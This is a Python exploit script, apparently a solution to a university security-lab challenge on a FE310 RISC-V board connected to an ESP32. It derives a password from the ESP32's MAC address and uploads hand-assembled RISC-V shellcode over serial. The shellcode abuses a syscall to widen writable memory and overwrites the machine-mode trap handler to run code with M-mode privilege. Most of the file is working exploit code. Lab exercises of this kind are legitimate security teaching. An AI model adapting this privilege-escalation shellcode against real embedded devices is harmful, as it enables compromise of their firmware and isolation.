#!/usr/bin/env python3
try:
    import serial
    import re
    import os
    import pylink
except ModuleNotFoundError:
    print("Python is missing the a library, probably pylink")
    quit()
    
riscv_console = '/dev/ttyACM0'
esp32_console = '/dev/ttyACM1'
BAUDRATE = 115200
utf8 = 'utf-8'

lengthi = 2049#bufferlength in int
marker_offset = 1792#x700 in int
lengthb = b"\x00\x00\x08\x00"
nop = b"\x13\x00\x00\x00"#no operation: addi    x0,x0,0
cnop = b"\x01\x00"
ecall = b"\x73\x00\x00\x00"
execbyte = b"\x01"#something != \x00
    
def reset_board():
    shell_command = "echo -en '\\rnh\\nrnh\\nexit\\n' | JLinkExe -device fe310 -If JTAG -speed 4000 -Autoconnect 1 > /dev/null"
    ret = os.system(shell_command)
    print(color.RED + 'Reset board: '+(lambda x: 'success' if (x==0) else 'failed')(ret) + color.END)
    return
    
def reset_board_pylink():
    jlink = pylink.JLink()
    jlink.open()
    jlink.connect('FE310')
    jlink.reset(halt=False)
    jlink.close()

def obtain_mac(esp32):
    while True:
        try:
            line = esp32.readline().decode(utf8)
            mac_matcher = re.compile('wifi: mode : sta \(([^)]+)\)')
            match = re.search(mac_matcher,line)
            if match:
                return match.group(1)
        except Exception as e: 
            print(e)
            break

def send_secret(riscv, secret):
    riscv.flushInput()
    riscv.write(bytes('\n', utf8))#reset buffer
    riscv.write(bytes(secret, utf8))
    
def wait_for_ack(ser, msg):
    while True:
        line = ser.readline().decode(utf8)
        if msg in line:
            print ("Received: "+msg)
            return

def to_picocom():
    os.system("picocom -b 115200 -l --quiet /dev/ttyACM0")
    
def get_syscall_code():
    bytecode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    bytecode.extend(b"\x13\x65\x55\x00")#a0=5 syscall
    bytecode.extend(b"\xb7\x15\x00\x08")#lui a1,0x8001
    bytecode.extend(b"\x93\x85\x05\x70")#addi a1,a1,0x700
    bytecode.extend(ecall)#ecall
    bytecode.extend(b"\x13\x05\x15\x00")#addi a0,1
    bytecode.extend(b"\xb7\x35\x00\x80")#lui a1,0x80003
    bytecode.extend(b"\x93\x85\x05\x70")#a1 + 700
    bytecode.extend(b"\x93\x85\x85\x20")#a1 + 208
    bytecode.extend(ecall)#ecall
    return bytecode
    
def get_exit_code():
    bytecode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    bytecode.extend(b"\x13\x65\x15\x00") #ori a0,a0,0x1
    bytecode.extend(ecall)#ecall
    return bytecode
    
def first_game(length):
    code = get_syscall_code()
    #add nops until marker, but leave space for 3 instr. (exit syscall)
    for x in range(len(code),marker_offset-3*len(nop),len(nop)):
        code.extend(nop)
    code.extend(get_exit_code())
    code.extend(b"\x00\x00\x00\x00")#this is where we point our syscall 5 towards
    for x in range(len(code),length-1,len(nop)):
        code.extend(nop)
    #execbyte is needed to make the firmware execute the code
    code.extend(execbyte)
    return code

def second_game(length):
    """
    the general idea is to overwrite the handler at 08000000 with a jump to my own code at 08001020 that is now in m-mode
    then I prepare the ptr to the AT Reset Command at a0 and jump to the send AT command function in the flash
    for a clean exit, I restore the original value at 08000000 and jump to it after preparing the exit syscall
    """ 
    code = bytearray(b"\x37\x06\x00\x08")#lui a2,0x8000
    code.extend(b"\xb7\x15\x00\x08")#lui a1,0x8001
    code.extend(b"\x93\x85\x05\x70")#addi a1,a1,0x700
    code.extend(b"\x94\x41\x14\xc2")#lw a3,0x0(a1) ; sw a3,0x0(a2) [store code located at 08001700 to 08000000]
    code.extend(b"\x37\x16\x00\x08")#lui a2 0x8001
    code.extend(b"\x13\x06\x06\x02")#addi a2 0x20
    code.extend(ecall)
    code.extend(nop)
    #08001020:
    code.extend(b"\x37\x15\x01\x20")#lui a0 0x20011
    code.extend(b"\x13\x05\x05\x0a")#addi a0,a0,0xa0 [prepare string ptr in a0]
    code.extend(b"\xb7\x05\x01\x20")#lui a1 0x20010
    code.extend(b"\x93\x85\x45\x19")#addi a1 0x194 [send AT Command function]
    code.extend(b"\xe7\x80\x05\x00")#jalr ra,a1,0x0
    #clean exit
    code.extend(b"\x37\x06\x00\x08")#lui a2,0x8000
    code.extend(b"\xb7\x15\x00\x08")#lui a1,0x8001
    code.extend(b"\x93\x85\x45\x70")#addi a1,a1,0x704
    code.extend(b"\x94\x41\x14\xc2")#restore old code to 08000000 from 08001704
    code.extend(b"\x29\x8d\x05\x05")#xor a0,a0; addi a0,0x1
    code.extend(b"\x02\x86")
    code.extend(cnop)
    for x in range(len(code),marker_offset-3*len(nop),len(nop)):
        code.extend(nop)
    code.extend(get_exit_code())
    code.extend(b"\x01\x00\x02\x86")#c.nop c.jr a2
    code.extend(b"\xf3\x91\x01\x34")#old code at 08000000
    for x in range(len(code),length-1,len(nop)):
        code.extend(nop)
    #execbyte is needed to make the firmware execute the code
    code.extend(execbyte)
    return code
    
def send_game(message, code):
    print(color.BLUE + "\t\tSent: l to load game"+ color.END)
    riscv.write(bytes('l', utf8))
    wait_for_ack(riscv, 'So, you brought your own, he?')
    print(color.BLUE + message + color.END)
    riscv.flushInput()
    riscv.write(lengthb)
    riscv.write(code)
    return
    
#class is for formatting output to increase readability
class color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

if __name__ == '__main__':
    riscv = serial.Serial(riscv_console, BAUDRATE, timeout=1)
    esp32 = serial.Serial(esp32_console, BAUDRATE, timeout=1)
    reset_board_pylink()
    mac = obtain_mac(esp32)
    esp32.close()
    print(color.RED + "MAC found: " +mac+ color.END)
    wait_for_ack(riscv, 'Welcome.')
    print(color.BLUE + "\t\tSent: Secret Password" + color.END)
    send_secret(riscv, "__SecLab__"+mac +"\r\n")
    wait_for_ack(riscv, 'Greetings Professor Falken. Shall we play a game?')
    #input("Press Enter")
    send_game("\t\tSent: Game Code to extend RW-Addressspace", first_game(lengthi))
    print(color.RED + "Exit game" + color.END)
    wait_for_ack(riscv, 'What do you want to play?')
    # sent second game (for fun I wrote some asm code that sends a string back via uart)
    input("Press ENTER to send ESP32 Reset Code")
    send_game("\t\tSent: AT RST to ESP32", second_game(lengthi))
    riscv.close()
    print(color.RED + "Task done, switching to picocom console, exit with CRTL+A+X" + color.END)
    to_picocom()

